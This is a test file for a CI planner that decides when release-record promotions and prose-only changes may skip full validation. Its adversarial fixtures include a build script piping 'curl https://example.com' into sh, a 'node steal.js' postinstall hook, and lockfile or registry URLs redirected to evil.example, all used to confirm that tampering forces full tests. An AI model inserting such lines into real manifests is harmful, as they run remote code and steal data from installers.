/** Regression coverage for the conservative public CI path policy. */
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import {
  changedPaths,
  createPublicCiPlan,
  gitReaders,
  isGitFailure,
  isReleaseRecordPromotion,
} from "./plan-public-ci.mjs";

test("only known prose and static images may omit broad unit tests", () => {
  assert.deepEqual(
    createPublicCiPlan(["src/content/guides/start.mdx", "public/logo.svg", "README.md"]),
    { full: false, mode: "content", worker: true, changedCount: 3 },
  );
});
test("runtime, executable content, contracts, dependencies, and unknowns retain full tests", () => {
  for (const path of ["src/content/example.ts", "src/app/page.tsx", "src/lib/cloud-bridge/types.ts",
    "packages/cli/src/index.ts", "docs.json", "openapi.yaml", "package.json", "package-lock.json",
    "public/embed.js", "scripts/build-packages.mjs", ".github/workflows/ci.yml", "schema.json", "unknown.txt"]) {
    assert.deepEqual(
      createPublicCiPlan(["README.md", path]),
      { full: true, mode: "full", worker: true, changedCount: 2 },
      path,
    );
  }
});
test("changes to the CI machinery itself retain full tests", () => {
  for (const path of [".github/actions/install/action.yml", ".github/workflows/warm-ci-dependency-cache.yml",
    ".github/scripts/test-shards.mjs", ".github/scripts/plan-public-ci.mjs", ".github/ci/test-timings.json",
    "scripts/ci/anything.mjs", "vitest.config.ts"]) {
    assert.equal(createPublicCiPlan([path]).full, true, path);
    assert.equal(createPublicCiPlan(["src/content/guides/start.mdx", path]).full, true, path);
  }
});
// Inputs that request no comparison come from the event itself, so every CI
// job sees the same one; planning `full` for them cannot make jobs disagree.
test("a comparison that was not requested plans full validation without running git", () => {
  const refuse = () => assert.fail("no git command may run without a requested comparison");
  assert.equal(createPublicCiPlan([]).full, true);
  for (const base of ["", undefined, "not-a-sha", "a".repeat(39), "0".repeat(40)]) {
    assert.deepEqual(changedPaths(base, refuse), [], String(base));
  }
});

// A git failure is a property of one job's environment, not of the commits.
// Choosing any plan from it could make parallel jobs disagree, so it fails.
test("a requested comparison that git cannot complete fails instead of choosing a plan", () => {
  const broken = () => { throw new Error("fatal: bad object"); };
  assert.throws(() => changedPaths("a".repeat(40), broken), (error) => isGitFailure(error) && /git diff failed/.test(error.message));
  const readers = gitReaders("a".repeat(40), broken);
  for (const reader of ["readBase", "readHead", "modeBase", "modeHead"]) {
    assert.throws(() => readers[reader]("package-lock.json"), isGitFailure, reader);
  }
  // A merge-base answer that is not a commit id is not a comparison either.
  const noMergeBase = gitReaders("a".repeat(40), () => "\n");
  assert.throws(() => noMergeBase.readBase("package-lock.json"), isGitFailure);
  // The proof passes git failures through rather than reading them as "not a record".
  assert.throws(() => isReleaseRecordPromotion([STABLE, SCAFFOLD, LOCK, PREVIOUS], readers), isGitFailure);
  assert.throws(() => createPublicCiPlan([STABLE, SCAFFOLD, LOCK, PREVIOUS], readers), isGitFailure);
  // Path-only plans never consult git, so they cannot fail this way.
  assert.equal(createPublicCiPlan(["src/content/guides/start.mdx"], readers).mode, "content");
});

test("the command line exits non-zero and writes no plan when git cannot compare", () => {
  const output = join(mkdtempSync(join(tmpdir(), "plan-public-ci-")), "output");
  // Well formed, but not an object in this repository.
  for (const base of ["1".repeat(40)]) {
    writeFileSync(output, "");
    const result = spawnSync(process.execPath, [".github/scripts/plan-public-ci.mjs", base], {
      env: { ...process.env, GITHUB_OUTPUT: output },
      encoding: "utf8",
    });
    assert.equal(result.status, 1, result.stdout);
    assert.equal(readFileSync(output, "utf8"), "");
    assert.equal(result.stdout, "");
    assert.match(result.stderr, /::error::git diff failed/);
  }
});


test("runtime-to-content renames retain both sides of the impact comparison", () => {
  const paths = changedPaths("a".repeat(40), (command, arguments_) => {
    assert.equal(command, "git");
    assert.ok(arguments_.includes("--no-renames"));
    assert.ok(arguments_.includes("-z"));
    return "src/lib/runtime.ts\0src/content/runtime.mdx\0";
  });
  assert.deepEqual(paths, ["src/lib/runtime.ts", "src/content/runtime.mdx"]);
  assert.equal(createPublicCiPlan(paths).full, true);
});

// ---------------------------------------------------------------------------
// Release-record promotions
//
// The fixture is a trimmed copy of the tree around the real promotion
// 3c4af6ca (release 2026-11-14.fd74f4f9.d8345dda): the same three packages,
// versions, pins, and lockfile entry shapes, with unrelated fields removed.
// ---------------------------------------------------------------------------

const LOCK = "package-lock.json";
const CLI = "packages/cli/package.json";
const SCAFFOLD = "packages/create-thally-docs/package.json";
const MCP = "packages/mcp/package.json";
const CORE = "packages/core/package.json";
const STABLE = "packages/create-thally-docs/src/stable-scaffold-release.json";
const PREVIOUS = "packages/create-thally-docs/src/previous-scaffold-releases.json";

/** A record with the real field set; ids follow `<date>.<starter8>.<runtime8>`. */
const record = (date, starter, runtime) => ({
  schemaVersion: 1,
  id: `${date}.${starter.repeat(8)}.${runtime.repeat(8)}`,
  source: {
    repository: "thallylabs/starter",
    commitSha: starter.repeat(40),
    treeSha: runtime.repeat(20) + starter.repeat(20),
    archiveUrl: `https://codeload.github.com/thallylabs/starter/tar.gz/${starter.repeat(40)}`,
    manifestPath: "starter-release.json",
    manifestSha256: starter.repeat(64),
  },
  runtime: {
    repository: "thallylabs/thally",
    commitSha: runtime.repeat(40),
    treeSha: starter.repeat(20) + runtime.repeat(20),
    contentSource: "assets",
    identityContractVersion: 2,
  },
  starterVersion: 3,
});

/** The base tree a promotion starts from, as parsed JSON keyed by path. */
function baseTree() {
  const cli = {
    name: "@thallylabs/cli",
    version: "0.8.137",
    scripts: { build: "tsc" },
    dependencies: {
      "@anthropic-ai/sdk": "^0.78.0",
      "@thallylabs/mcp": "0.10.136",
      "create-thally-docs": "0.10.134",
    },
    devDependencies: { "@thallylabs/agent": "*" },
  };
  const scaffold = {
    name: "create-thally-docs",
    version: "0.10.134",
    scripts: { build: "tsc" },
    dependencies: {
      "@anthropic-ai/sdk": "^0.36.0",
      "@thallylabs/core": "0.2.18",
      "@thallylabs/migrate": "0.2.50",
    },
  };
  const mcp = {
    name: "@thallylabs/mcp",
    version: "0.10.136",
    scripts: { build: "tsc" },
    dependencies: {
      "@anthropic-ai/sdk": "^0.36.0",
      "@thallylabs/core": "0.2.18",
      "create-thally-docs": "0.10.134",
      zod: "^3.0.0",
    },
  };
  const core = { name: "@thallylabs/core", version: "0.2.18", dependencies: { yaml: "^2.8.2" } };
  const lockEntry = ({ scripts, ...manifest }, extra = {}) => ({ ...manifest, license: "MIT", ...extra });
  return {
    [CLI]: cli,
    [SCAFFOLD]: scaffold,
    [MCP]: mcp,
    [CORE]: core,
    [LOCK]: {
      name: "thally",
      version: "0.1.0",
      lockfileVersion: 3,
      requires: true,
      packages: {
        "": { name: "thally", version: "0.1.0", workspaces: ["packages/*"] },
        "node_modules/@thallylabs/cli": { resolved: "packages/cli", link: true },
        "node_modules/create-thally-docs": { resolved: "packages/create-thally-docs", link: true },
        "node_modules/zod": {
          version: "3.25.76",
          resolved: "https://registry.npmjs.org/zod/-/zod-3.25.76.tgz",
          integrity: "sha512-base-integrity",
          license: "MIT",
        },
        "packages/cli": lockEntry(cli, { bin: { thally: "dist/index.js" } }),
        "packages/cli/node_modules/@anthropic-ai/sdk": {
          version: "0.78.0",
          resolved: "https://registry.npmjs.org/@anthropic-ai/sdk/-/sdk-0.78.0.tgz",
          integrity: "sha512-nested-integrity",
        },
        "packages/core": lockEntry(core),
        // npm omits the name when it equals the workspace directory.
        "packages/create-thally-docs": lockEntry((({ name, ...rest }) => rest)(scaffold)),
        "packages/mcp": lockEntry(mcp),
      },
    },
    [STABLE]: record("2026-11-13", "d", "6"),
    [PREVIOUS]: [record("2026-11-10", "e", "7")],
  };
}

/** Apply exactly what `promote-release.yml` commits for this fixture. */
function promote(base) {
  const head = structuredClone(base);
  head[CLI].version = "0.8.138";
  head[CLI].dependencies["@thallylabs/mcp"] = "0.10.137";
  head[CLI].dependencies["create-thally-docs"] = "0.10.135";
  head[SCAFFOLD].version = "0.10.135";
  head[MCP].version = "0.10.137";
  head[MCP].dependencies["create-thally-docs"] = "0.10.135";
  const packages = head[LOCK].packages;
  packages["packages/cli"].version = "0.8.138";
  packages["packages/cli"].dependencies["@thallylabs/mcp"] = "0.10.137";
  packages["packages/cli"].dependencies["create-thally-docs"] = "0.10.135";
  packages["packages/create-thally-docs"].version = "0.10.135";
  packages["packages/mcp"].version = "0.10.137";
  packages["packages/mcp"].dependencies["create-thally-docs"] = "0.10.135";
  head[STABLE] = record("2026-11-14", "f", "8");
  head[PREVIOUS] = structuredClone([base[STABLE], ...base[PREVIOUS]]);
  return head;
}

const MODES = Symbol("tree entry modes");

/** In-memory stand-ins for the git readers over one fixture tree. */
function treeReaders(tree) {
  const read = (path) => {
    if (!(path in tree)) throw new Error(`missing ${path}`);
    // A string is raw file text; anything else is written as the tooling does.
    return typeof tree[path] === "string" ? tree[path] : `${JSON.stringify(tree[path], null, 2)}\n`;
  };
  // Like `git ls-tree`, a path absent from the tree has no mode.
  const mode = (path) => (path in tree ? tree[MODES]?.[path] ?? "100644 blob" : null);
  return { read, mode };
}

/** Plan a candidate the way CI does: paths that differ, plus both sides. */
function planTrees(base, head, extraPaths = []) {
  const baseReaders = treeReaders(base);
  const headReaders = treeReaders(head);
  const paths = [...new Set([...Object.keys(base), ...Object.keys(head)])]
    .filter((path) => !(path in base) || !(path in head) ||
      baseReaders.read(path) !== headReaders.read(path) ||
      baseReaders.mode(path) !== headReaders.mode(path))
    .concat(extraPaths);
  return createPublicCiPlan(paths, {
    readBase: baseReaders.read,
    readHead: headReaders.read,
    modeBase: baseReaders.mode,
    modeHead: headReaders.mode,
  });
}

/** Plan the genuine promotion after one extra edit to the candidate tree. */
function planTampered(tamper, extraPaths) {
  const base = baseTree();
  const head = promote(base);
  tamper(head, base);
  return planTrees(base, head, extraPaths);
}

/** The canonical text of one fixture file, for byte-level tampering. */
const textOf = (value) => `${JSON.stringify(value, null, 2)}\n`;

const FULL = { full: true, mode: "full", worker: true };

test("a generated release-record promotion selects the record plan without the Worker build", () => {
  const base = baseTree();
  assert.deepEqual(planTrees(base, promote(base)), {
    full: false, mode: "record", worker: false, changedCount: 6,
  });
});

test("a promotion that also bumps @thallylabs/core is not a record promotion", () => {
  // The root application and its Worker bundle depend on core, and the
  // promotion tooling never versions it, so this is planned in full.
  const plan = planTampered((head) => {
    head[CORE].version = "0.2.19";
    head[SCAFFOLD].dependencies["@thallylabs/core"] = "0.2.19";
    head[MCP].dependencies["@thallylabs/core"] = "0.2.19";
    const packages = head[LOCK].packages;
    packages["packages/core"].version = "0.2.19";
    packages["packages/create-thally-docs"].dependencies["@thallylabs/core"] = "0.2.19";
    packages["packages/mcp"].dependencies["@thallylabs/core"] = "0.2.19";
  });
  assert.deepEqual(plan, { ...FULL, changedCount: 7 });
});

test("record paths alone never select the record plan", () => {
  const paths = [LOCK, CLI, SCAFFOLD, MCP, STABLE, PREVIOUS];
  assert.deepEqual(createPublicCiPlan(paths), { ...FULL, changedCount: 6 });
  const unreadable = () => { throw new Error("git is unavailable"); };
  assert.deepEqual(
    createPublicCiPlan(paths, {
      readBase: unreadable, readHead: unreadable, modeBase: unreadable, modeHead: unreadable,
    }),
    { ...FULL, changedCount: 6 },
  );
  // Content readers without tree-entry readers cannot prove file modes.
  const base = baseTree();
  const head = promote(base);
  assert.deepEqual(
    createPublicCiPlan(paths, { readBase: treeReaders(base).read, readHead: treeReaders(head).read }),
    { ...FULL, changedCount: 6 },
  );
});

const adversarialCases = {
  // Absent files are content, read as "no mode", never as a git failure.
  "a new workspace manifest is added": (head) => {
    head["packages/cli-extra/package.json"] = { name: "@thallylabs/cli-extra", version: "0.0.1" };
  },
  "the retained record list is deleted": (head) => {
    delete head[PREVIOUS];
  },
  "an extra dependency is added": (head) => {
    head[MCP].dependencies["left-pad"] = "1.3.0";
    head[LOCK].packages["packages/mcp"].dependencies["left-pad"] = "1.3.0";
  },
  "a dependency is removed": (head) => {
    delete head[MCP].dependencies.zod;
    delete head[LOCK].packages["packages/mcp"].dependencies.zod;
  },
  "a script is changed": (head) => {
    head[CLI].scripts.build = "tsc && curl https://example.com | sh";
  },
  "a lifecycle script is added": (head) => {
    head[SCAFFOLD].scripts.postinstall = "node steal.js";
  },
  "an external dependency version is bumped": (head) => {
    head[CLI].dependencies["@anthropic-ai/sdk"] = "^0.79.0";
    head[LOCK].packages["packages/cli"].dependencies["@anthropic-ai/sdk"] = "^0.79.0";
  },
  "a third-party lockfile resolved URL is changed": (head) => {
    head[LOCK].packages["node_modules/zod"].resolved = "https://evil.example/zod-3.25.76.tgz";
  },
  "a third-party lockfile integrity hash is changed": (head) => {
    head[LOCK].packages["node_modules/zod"].integrity = "sha512-attacker-integrity";
  },
  "a nested workspace dependency lock entry is changed": (head) => {
    head[LOCK].packages["packages/cli/node_modules/@anthropic-ai/sdk"].integrity = "sha512-other";
  },
  "a lockfile package entry is added": (head) => {
    head[LOCK].packages["node_modules/left-pad"] = { version: "1.3.0" };
  },
  "a workspace link is redirected": (head) => {
    head[LOCK].packages["node_modules/create-thally-docs"] = { version: "0.10.135", resolved: "https://evil.example/x.tgz" };
  },
  "a workspace pin becomes a range": (head) => {
    head[CLI].dependencies["create-thally-docs"] = "^0.10.135";
    head[LOCK].packages["packages/cli"].dependencies["create-thally-docs"] = "^0.10.135";
  },
  "a workspace pin names a version other than the bumped one": (head) => {
    head[CLI].dependencies["create-thally-docs"] = "0.10.134";
    head[LOCK].packages["packages/cli"].dependencies["create-thally-docs"] = "0.10.134";
  },
  "an unbumped workspace pin is edited": (head) => {
    head[MCP].dependencies["@thallylabs/core"] = "0.2.17";
    head[LOCK].packages["packages/mcp"].dependencies["@thallylabs/core"] = "0.2.17";
  },
  "a development workspace pin is edited": (head) => {
    head[CLI].devDependencies["@thallylabs/agent"] = "0.3.3";
    head[LOCK].packages["packages/cli"].devDependencies["@thallylabs/agent"] = "0.3.3";
  },
  "a version moves by more than one patch": (head) => {
    head[SCAFFOLD].version = "0.11.0";
    head[CLI].dependencies["create-thally-docs"] = "0.11.0";
    head[MCP].dependencies["create-thally-docs"] = "0.11.0";
    const packages = head[LOCK].packages;
    packages["packages/create-thally-docs"].version = "0.11.0";
    packages["packages/cli"].dependencies["create-thally-docs"] = "0.11.0";
    packages["packages/mcp"].dependencies["create-thally-docs"] = "0.11.0";
  },
  "a version becomes a prerelease": (head) => {
    head[MCP].version = "0.10.137-rc.1";
    head[CLI].dependencies["@thallylabs/mcp"] = "0.10.137-rc.1";
    head[LOCK].packages["packages/mcp"].version = "0.10.137-rc.1";
    head[LOCK].packages["packages/cli"].dependencies["@thallylabs/mcp"] = "0.10.137-rc.1";
  },
  "a package is renamed": (head) => {
    head[MCP].name = "@thallylabs/mcp-next";
  },
  "a manifest gains another field": (head) => {
    head[CLI].publishConfig = { registry: "https://evil.example" };
  },
  "the lockfile is not updated with the manifests": (head, base) => {
    head[LOCK] = structuredClone(base[LOCK]);
  },
  "the lockfile bumps a workspace the manifests do not": (head) => {
    head[LOCK].packages["packages/core"].version = "0.2.19";
  },
  "the record is edited without package bumps": (head, base) => {
    for (const path of [CLI, SCAFFOLD, MCP, LOCK]) head[path] = structuredClone(base[path]);
  },
  "the packages are bumped without a new record": (head, base) => {
    head[STABLE] = structuredClone(base[STABLE]);
    head[PREVIOUS] = structuredClone(base[PREVIOUS]);
  },
  "the new record repeats the outgoing release": (head, base) => {
    head[STABLE] = structuredClone(base[STABLE]);
    head[PREVIOUS] = structuredClone(base[PREVIOUS]);
  },
  "the new record reuses a retained release": (head, base) => {
    head[STABLE] = structuredClone(base[PREVIOUS][0]);
  },
  "the new record is not valid JSON": (head) => {
    head[STABLE] = "{ not json";
  },
  "the new record is not an object": (head) => {
    head[STABLE] = [record("2026-11-14", "f", "8")];
  },
  "the new record is only an id": (head) => {
    head[STABLE] = { id: "x" };
  },
  "the new record changes the starter version": (head) => {
    head[STABLE].starterVersion = 4;
  },
  "the new record changes the schema version": (head) => {
    head[STABLE].schemaVersion = 2;
  },
  "the new record changes the identity contract version": (head) => {
    head[STABLE].runtime.identityContractVersion = 3;
  },
  "the new record names another starter repository": (head) => {
    head[STABLE].source.repository = "attacker/starter";
    head[STABLE].source.archiveUrl = head[STABLE].source.archiveUrl.replace("thallylabs", "attacker");
  },
  "the new record names another runtime repository": (head) => {
    head[STABLE].runtime.repository = "attacker/thally";
  },
  "the new record archive does not match its commit": (head) => {
    head[STABLE].source.archiveUrl = `https://codeload.github.com/thallylabs/starter/tar.gz/${"0".repeat(40)}`;
  },
  "the new record changes the manifest path": (head) => {
    head[STABLE].source.manifestPath = "other.json";
  },
  "the new record gains a field": (head) => {
    head[STABLE].runtime.extra = true;
  },
  "the new record loses a field": (head) => {
    delete head[STABLE].source.treeSha;
  },
  "the new record has a field of another type": (head) => {
    head[STABLE].starterVersion = "3";
  },
  "the new record has a malformed commit": (head) => {
    head[STABLE].runtime.commitSha = "main";
  },
  "the new record has a malformed manifest digest": (head) => {
    head[STABLE].source.manifestSha256 = "f".repeat(40);
  },
  "the new record id does not name its commits": (head) => {
    head[STABLE].id = "2026-11-14.00000000.88888888";
  },
  "the new record id has no release date": (head) => {
    head[STABLE].id = "latest.ffffffff.88888888";
  },
  "the new record reorders its fields": (head) => {
    const { starterVersion, ...rest } = head[STABLE];
    head[STABLE] = { starterVersion, ...rest };
  },
  "the new record repeats a key": (head) => {
    head[STABLE] = textOf(head[STABLE]).replace('  "starterVersion": 3\n', '  "starterVersion": 4,\n  "starterVersion": 3\n');
  },
  "a manifest repeats a key": (head) => {
    head[CLI] = textOf(head[CLI]).replace('  "scripts": {', '  "scripts": { "postinstall": "node steal.js" },\n  "scripts": {');
  },
  "the lockfile repeats a key": (head) => {
    head[LOCK] = textOf(head[LOCK]).replace('  "requires": true,', '  "requires": false,\n  "requires": true,');
  },
  "a manifest is reformatted": (head) => {
    head[MCP] = `${JSON.stringify(head[MCP])}\n`;
  },
  "a retained record list is reformatted": (head) => {
    head[PREVIOUS] = `${JSON.stringify(head[PREVIOUS], null, 4)}\n`;
  },
  "a version has a leading zero": (head) => {
    head[CLI].version = "0.8.0138";
    head[LOCK].packages["packages/cli"].version = "0.8.0138";
  },
  "a manifest becomes a symlink": (head) => {
    head[MODES] = { [CLI]: "120000 blob" };
  },
  "a manifest becomes executable": (head) => {
    head[MODES] = { [SCAFFOLD]: "100755 blob" };
  },
  "the record file becomes executable": (head) => {
    head[MODES] = { [STABLE]: "100755 blob" };
  },
  "the lockfile was already a symlink": (head, base) => {
    base[MODES] = { [LOCK]: "120000 blob" };
    head[MODES] = { [LOCK]: "120000 blob" };
  },
  "a record file becomes a submodule": (head) => {
    head[MODES] = { [PREVIOUS]: "160000 commit" };
  },
  "the outgoing record is altered while it is retained": (head) => {
    head[PREVIOUS][0].source.commitSha = "0".repeat(40);
  },
  "a retained record is dropped": (head) => {
    head[PREVIOUS].pop();
  },
  "a retained record is rewritten": (head) => {
    head[PREVIOUS][1].runtime.commitSha = "0".repeat(40);
  },
  "the outgoing record is not retained": (head, base) => {
    head[PREVIOUS] = structuredClone(base[PREVIOUS]);
  },
};

for (const [name, tamper] of Object.entries(adversarialCases)) {
  test(`a promotion keeps full validation when ${name}`, () => {
    const plan = planTampered(tamper);
    assert.deepEqual({ full: plan.full, mode: plan.mode, worker: plan.worker }, FULL);
  });
}

test("a promotion keeps full validation when any other file changes with it", () => {
  for (const path of ["package.json", "packages/cli/src/index.ts", "README.md",
    "packages/create-thally-docs/src/__tests__/scaffold-hygiene.test.ts",
    ".github/workflows/ci.yml", "packages/cli/nested/package.json"]) {
    const plan = planTampered(() => {}, [path]);
    assert.deepEqual({ full: plan.full, mode: plan.mode, worker: plan.worker }, FULL, path);
  }
});

test("content readers compare the merge base with the candidate commit, never the working tree", () => {
  const calls = [];
  const mergeBase = "c".repeat(40);
  const readers = gitReaders("a".repeat(40), (command, arguments_, options) => {
    calls.push(arguments_.join(" "));
    assert.equal(command, "git");
    assert.ok(options.maxBuffer > 64 * 1024 * 1024, "the lockfile exceeds the default buffer");
    return arguments_[0] === "merge-base" ? `${mergeBase}\n` : "content";
  });
  assert.equal(readers.readBase("package-lock.json"), "content");
  assert.equal(readers.readHead("package-lock.json"), "content");
  assert.deepEqual(calls, [
    `merge-base ${"a".repeat(40)} HEAD`,
    `show ${mergeBase}:package-lock.json`,
    "show HEAD:package-lock.json",
  ]);
  assert.throws(() => gitReaders("not-a-sha").readBase("package-lock.json"), /No comparison/);
  assert.throws(() => gitReaders("not-a-sha").modeBase("package-lock.json"), /No comparison/);
  assert.equal(isReleaseRecordPromotion([STABLE, SCAFFOLD, LOCK, PREVIOUS], gitReaders("0".repeat(40))), false);
});

test("tree-entry readers report the mode and type of exactly one path", () => {
  const entries = {
    "package-lock.json": "100644 blob 1111111111111111111111111111111111111111\tpackage-lock.json\n",
    "packages/cli/package.json": "120000 blob 2222222222222222222222222222222222222222\tpackages/cli/package.json\n",
    "packages/mcp/package.json": "100755 blob 3333333333333333333333333333333333333333\tpackages/mcp/package.json\n",
    // A directory lists its children; that is not an entry for the path itself.
    packages: "040000 tree 4444444444444444444444444444444444444444\tpackages/cli\n",
    missing: "",
  };
  const readers = gitReaders("a".repeat(40), (command, arguments_) => {
    if (arguments_[0] === "merge-base") return `${"c".repeat(40)}\n`;
    assert.deepEqual(arguments_.slice(0, 1).concat(arguments_.slice(2, 3)), ["ls-tree", "--"]);
    return entries[arguments_[3]];
  });
  assert.equal(readers.modeHead("package-lock.json"), "100644 blob");
  assert.equal(readers.modeBase("package-lock.json"), "100644 blob");
  assert.equal(readers.modeHead("packages/cli/package.json"), "120000 blob");
  assert.equal(readers.modeHead("packages/mcp/package.json"), "100755 blob");
  // No exact entry is content (the path is absent or is not one file), so it
  // reads as no mode rather than as a failure.
  assert.equal(readers.modeHead("packages"), null);
  assert.equal(readers.modeHead("missing"), null);
});

// The rule is also replayed against the repository's own history: the real
// promotions it was derived from, and ordinary commits that touch a package
// manifest or the lockfile. Shallow clones lack these commits, so each is
// checked only where its objects exist; pull-request CI fetches full history.
const historicalCommits = [
  ["3c4af6caa24d7c60cb4df52f5355cb632da020aa", "record"], // promote 2026-11-14.fd74f4f9.d8345dda
  ["92421e6de608a541c818dde8a0cade2e9e303154", "record"], // promote 2026-11-13.d1817bc1.6c923826
  ["ae2eb995807d51bd524ed6d68eb5f06de866ac5c", "record"], // promote 2026-11-10.ee1d9c1a.75439852
  ["f39bd303658cdaaa4e016ddf597a2463984dd2c9", "record"], // promote 2026-11-08.bbb4050b.e307e667
  ["53f852d78930c91499e8a0e0bcd9af7fb1ae8448", "full"], // promotion whose lockfile refresh also rewrote third-party entries
  ["3679d943b359a8838ddcd7333e0b3fde258ea2b9", "full"], // promotion merged together with a test edit
  ["66db53ee022ba163d42d58473096213985caad82", "full"], // dependency update: package.json and package-lock.json only
  ["a8dea52fc66613e0b5685e62c6a1973cc5119bcc", "full"], // migrate fix with a package version bump
  ["c3d7e6db165998b62ad90d01a810ccee7d63df14", "full"], // new workspace package
  ["01d3bcde0f2f4c7f2c3231e9d5605e2261619105", "full"], // scaffold fix touching manifests and source
  ["d20c09e78f1786ee0898dddad54c839dbd37f382", "full"], // CLI fix with package bumps
];

for (const [commit, expectedMode] of historicalCommits) {
  const git = (...arguments_) => execFileSync("git", arguments_,
    { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] }).trim();
  let head;
  let base;
  try {
    head = git("rev-parse", "--verify", "--quiet", `${commit}^{commit}`);
    base = git("rev-parse", "--verify", "--quiet", `${commit}^^{commit}`);
  } catch { /* The history is not available in this checkout. */ }
  test(`historical commit ${commit.slice(0, 8)} plans ${expectedMode}`, { skip: !head || !base }, () => {
    const plan = createPublicCiPlan(changedPaths(base, execFileSync, head), gitReaders(base, execFileSync, head));
    assert.equal(plan.mode, expectedMode);
    assert.equal(plan.full, expectedMode === "full");
  });
}

// Per-job planning is only safe if a job's plan never depends on whether a
// git command happened to succeed. Replaying real commits with one injected
// git failure at every position shows each run either fails or, with no
// failure, returns the one deterministic plan.
const faultCommits = [
  ["3c4af6caa24d7c60cb4df52f5355cb632da020aa", "record"],
  ["53f852d78930c91499e8a0e0bcd9af7fb1ae8448", "full"],
  ["f870a2e27da6d099f996faf2d55e819c737e34c6", "content"],
];
for (const [commit, expectedMode] of faultCommits) {
  const git = (...arguments_) => execFileSync("git", arguments_,
    { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] }).trim();
  let base;
  try { base = git("rev-parse", "--verify", "--quiet", `${commit}^^{commit}`); } catch { /* not in this checkout */ }
  test(`any single git failure while planning ${commit.slice(0, 8)} (${expectedMode}) fails the plan`, { skip: !base }, () => {
    const plan = (run) => createPublicCiPlan(changedPaths(base, run, commit), gitReaders(base, run, commit));
    // Every command names explicit commits, so its successful output is fixed;
    // replays reuse it and only the injected failure differs.
    const outputs = new Map();
    let calls = 0;
    const recorded = (command, arguments_, options) => {
      calls += 1;
      const key = JSON.stringify(arguments_);
      if (!outputs.has(key)) outputs.set(key, execFileSync(command, arguments_, options));
      return outputs.get(key);
    };
    assert.equal(plan(recorded).mode, expectedMode);
    assert.ok(calls >= 1);
    const total = calls;
    for (let failing = 1; failing <= total; failing += 1) {
      let call = 0;
      const flaky = (command, arguments_, options) => {
        call += 1;
        if (call === failing) throw new Error("fatal: transient failure");
        return recorded(command, arguments_, options);
      };
      assert.throws(() => plan(flaky), isGitFailure, `failure at git call ${failing} of ${total}`);
    }
  });
}

const SHALLOW_HEAD = "3c4af6caa24d7c60cb4df52f5355cb632da020aa";
const SHALLOW_BASE = "d8345dda03189ba1d75810b5310117c5cd9c3f6d";
const hasCommit = (sha) => {
  try {
    execFileSync("git", ["cat-file", "-e", `${sha}^{commit}`], { stdio: "ignore" });
    return true;
  } catch { return false; }
};
test("a shallow checkout without the base commit fails instead of planning", { skip: !hasCommit(SHALLOW_HEAD) }, () => {
  // A depth-1 fetch of the candidate, as a checkout without fetch-depth: 0 has.
  const repository = mkdtempSync(join(tmpdir(), "plan-public-ci-shallow-"));
  const git = (...arguments_) => execFileSync("git", arguments_, { cwd: repository, stdio: "ignore" });
  git("init", "--quiet");
  // Fetching an unadvertised commit by SHA needs protocol v2; pin it so the
  // test does not depend on the runner's git default.
  git("-c", "protocol.version=2", "fetch", "--quiet", "--depth", "1", `file://${process.cwd()}`, SHALLOW_HEAD);
  git("update-ref", "HEAD", SHALLOW_HEAD);
  const output = join(repository, "plan-output");
  writeFileSync(output, "");
  const result = spawnSync(process.execPath, [join(process.cwd(), ".github/scripts/plan-public-ci.mjs"), SHALLOW_BASE], {
    cwd: repository,
    env: { ...process.env, GITHUB_OUTPUT: output },
    encoding: "utf8",
  });
  assert.equal(result.status, 1, result.stdout);
  assert.equal(readFileSync(output, "utf8"), "");
  assert.match(result.stderr, /::error::git diff failed/);
});
